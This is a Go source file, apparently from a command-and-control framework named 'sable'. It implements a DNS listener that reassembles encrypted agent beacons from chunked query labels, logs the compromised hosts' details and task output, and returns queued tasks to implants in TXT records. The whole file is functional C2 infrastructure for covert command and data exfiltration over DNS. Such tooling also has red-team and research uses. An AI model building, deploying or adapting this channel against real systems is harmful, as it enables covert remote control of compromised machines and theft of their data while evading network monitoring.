package listener

import (
	"encoding/base32"
	"encoding/hex"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/aelder202/sable/internal/nonce"
	"github.com/aelder202/sable/internal/protocol"
	"github.com/aelder202/sable/internal/session"
	mdns "github.com/miekg/dns"
)

const (
	dnsChunkSize          = 30  // bytes per chunk before base32 encoding
	maxDNSSessions        = 256 // cap on concurrent in-progress beacon assemblies
	dnsSessExpiry         = 60 * time.Second
	maxDNSBeaconBytes     = 15 * 1024
	maxDNSChunks          = 512
	maxDNSRequestsPerHost = 128
	dnsRateWindow         = 10 * time.Second
)

// ChunkForDNS splits data into chunks suitable for DNS label encoding.
// Exported so the agent transport can use the same chunking logic.
func ChunkForDNS(data []byte) [][]byte {
	var chunks [][]byte
	for len(data) > 0 {
		n := dnsChunkSize
		if n > len(data) {
			n = len(data)
		}
		chunks = append(chunks, data[:n])
		data = data[n:]
	}
	return chunks
}

// dnsBeaconSession accumulates chunks from an in-progress DNS beacon.
type dnsBeaconSession struct {
	chunks      map[int][]byte
	totalChunks int
	createdAt   time.Time
}

// DNSHandler is an authoritative DNS server that decodes agent beacons.
// Query format: <base32chunk>.<index>.<total>.<sessionID>.<agentID>.<domain>
type DNSHandler struct {
	store    *session.Store
	nonces   *nonce.Cache
	domain   string // authoritative domain, must end with "."
	sources  *dnsRateLimiter
	mu       sync.Mutex
	sessions map[string]*dnsBeaconSession
}

// NewDNSHandler creates a DNSHandler for the given authoritative domain.
// domain must end with "." (e.g. "c2.example.com.")
func NewDNSHandler(store *session.Store, nc *nonce.Cache, domain string) *DNSHandler {
	return &DNSHandler{
		store:    store,
		nonces:   nc,
		domain:   domain,
		sources:  newDNSRateLimiter(),
		sessions: make(map[string]*dnsBeaconSession),
	}
}

type dnsBucket struct {
	count   int
	resetAt time.Time
}

type dnsRateLimiter struct {
	mu      sync.Mutex
	buckets map[string]*dnsBucket
}

func newDNSRateLimiter() *dnsRateLimiter {
	return &dnsRateLimiter{buckets: make(map[string]*dnsBucket)}
}

func (rl *dnsRateLimiter) allow(source string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	for key, bucket := range rl.buckets {
		if now.After(bucket.resetAt) {
			delete(rl.buckets, key)
		}
	}
	b, ok := rl.buckets[source]
	if !ok || now.After(b.resetAt) {
		rl.buckets[source] = &dnsBucket{
			count:   1,
			resetAt: now.Add(dnsRateWindow),
		}
		return true
	}
	if b.count >= maxDNSRequestsPerHost {
		return false
	}
	b.count++
	return true
}

// evictExpired removes sessions older than dnsSessExpiry. Must be called with h.mu held.
func (h *DNSHandler) evictExpired() {
	cutoff := time.Now().Add(-dnsSessExpiry)
	for id, s := range h.sessions {
		if s.createdAt.Before(cutoff) {
			delete(h.sessions, id)
		}
	}
}

// ServeDNS implements dns.Handler.
// Query name format: <base32chunk>.<chunkIndex>.<totalChunks>.<sessionID>.<agentID>.<domain>
func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
	m := new(mdns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	if len(r.Question) == 0 {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sourceIP := remoteIP(w.RemoteAddr())
	if !h.sources.allow(sourceIP) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	qname := strings.ToLower(r.Question[0].Name)
	domain := strings.ToLower(h.domain)

	if !strings.HasSuffix(qname, domain) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Strip the authoritative domain suffix and parse labels.
	inner := strings.TrimSuffix(qname, domain)
	inner = strings.TrimSuffix(inner, ".")
	labels := strings.Split(inner, ".")
	// Expected: [base32chunk, chunkIndex, totalChunks, sessionID, agentID]
	if len(labels) < 5 {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	b32chunk := strings.ToUpper(labels[0])
	chunkIdx, err := strconv.Atoi(labels[1])
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	totalChunks, err := strconv.Atoi(labels[2])
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sessionID := labels[3]
	agentID := labels[4]

	if !validDNSSessionID(sessionID) ||
		totalChunks <= 0 ||
		totalChunks > maxDNSChunks ||
		totalChunks*dnsChunkSize > maxDNSBeaconBytes ||
		chunkIdx < 0 ||
		chunkIdx >= totalChunks {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	chunkData, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(b32chunk)
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Accumulate chunk with session limits and expiry.
	sessionKey := sourceIP + "|" + agentID + "|" + sessionID
	h.mu.Lock()
	h.evictExpired()
	sess, ok := h.sessions[sessionKey]
	if !ok {
		if len(h.sessions) >= maxDNSSessions {
			// Session table full; drop request to prevent memory exhaustion.
			h.mu.Unlock()
			w.WriteMsg(m) //nolint:errcheck
			return
		}
		sess = &dnsBeaconSession{
			chunks:      make(map[int][]byte),
			totalChunks: totalChunks,
			createdAt:   time.Now(),
		}
		h.sessions[sessionKey] = sess
	} else if sess.totalChunks != totalChunks {
		h.mu.Unlock()
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	sess.chunks[chunkIdx] = chunkData
	complete := len(sess.chunks) == sess.totalChunks
	h.mu.Unlock()

	if !complete {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Reassemble in order.
	h.mu.Lock()
	sess, ok = h.sessions[sessionKey]
	if !ok {
		h.mu.Unlock()
		w.WriteMsg(m) //nolint:errcheck
		return
	}
	var assembled []byte
	for i := 0; i < totalChunks; i++ {
		chunk, ok := sess.chunks[i]
		if !ok || len(assembled)+len(chunk) > maxDNSBeaconBytes {
			delete(h.sessions, sessionKey)
			h.mu.Unlock()
			w.WriteMsg(m) //nolint:errcheck
			return
		}
		assembled = append(assembled, chunk...)
	}
	delete(h.sessions, sessionKey)
	h.mu.Unlock()

	// Apply the same security checks as the HTTPS listener.
	secret, ok := h.store.Secret(agentID)
	if !ok {
		dummySecret := make([]byte, 32)
		protocol.DecodeBeacon(assembled, dummySecret) //nolint:errcheck
		w.WriteMsg(m)                                 //nolint:errcheck
		return
	}

	beacon, err := protocol.DecodeBeacon(assembled, secret)
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Defense-in-depth: decrypted agent ID must match the query's agent ID.
	if beacon.AgentID != agentID {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Timestamp check.
	age := time.Since(time.Unix(beacon.Timestamp, 0))
	if age < 0 {
		age = -age
	}
	if age > 2*time.Minute {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Nonce replay check — atomic to close TOCTOU window between Seen and Add.
	if h.nonces.SeenOrAdd(beacon.Nonce) {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	h.store.UpdateInfo(beacon.AgentID, beacon.Hostname, beacon.OS, beacon.Arch)
	if beacon.TaskOutput != nil {
		h.store.RecordOutput(beacon.AgentID, beacon.TaskOutput)
	}

	task := h.store.DequeueTask(beacon.AgentID)
	if task == nil {
		task = &protocol.Task{Type: "noop"}
	}

	resp, err := protocol.EncodeTask(task, secret)
	if err != nil {
		w.WriteMsg(m) //nolint:errcheck
		return
	}

	// Encode response as hex so the TXT payload is always safe ASCII.
	// TXT strings are limited to 255 bytes each; split if necessary.
	hexStr := hex.EncodeToString(resp)
	var txtStrings []string
	for len(hexStr) > 255 {
		txtStrings = append(txtStrings, hexStr[:255])
		hexStr = hexStr[255:]
	}
	txtStrings = append(txtStrings, hexStr)

	txt := &mdns.TXT{
		Hdr: mdns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: mdns.TypeTXT,
			Class:  mdns.ClassINET,
			Ttl:    0,
		},
		Txt: txtStrings,
	}
	m.Answer = append(m.Answer, txt)
	w.WriteMsg(m) //nolint:errcheck
}

func remoteIP(addr net.Addr) string {
	if addr == nil {
		return ""
	}
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return addr.String()
	}
	return host
}

func validDNSSessionID(sessionID string) bool {
	if len(sessionID) != 16 {
		return false
	}
	_, err := hex.DecodeString(sessionID)
	return err == nil
}
